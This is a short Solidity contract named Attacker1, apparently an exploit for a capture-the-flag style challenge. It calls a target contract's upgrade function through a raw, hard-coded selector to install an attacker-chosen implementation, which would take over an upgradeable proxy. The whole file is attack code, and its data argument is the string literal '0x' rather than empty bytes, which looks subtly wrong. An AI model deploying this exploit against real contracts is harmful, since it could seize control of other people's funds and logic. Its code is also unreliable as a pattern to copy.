pragma solidity ^0.8.0;

contract Attacker1 {
    address instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function upgrade(address implementation) public {
        (bool success, ) = instance.call(abi.encodeWithSelector(0xb72ffbe4, implementation, "0x"));
        require(success, "Upgrade failed");
    }
}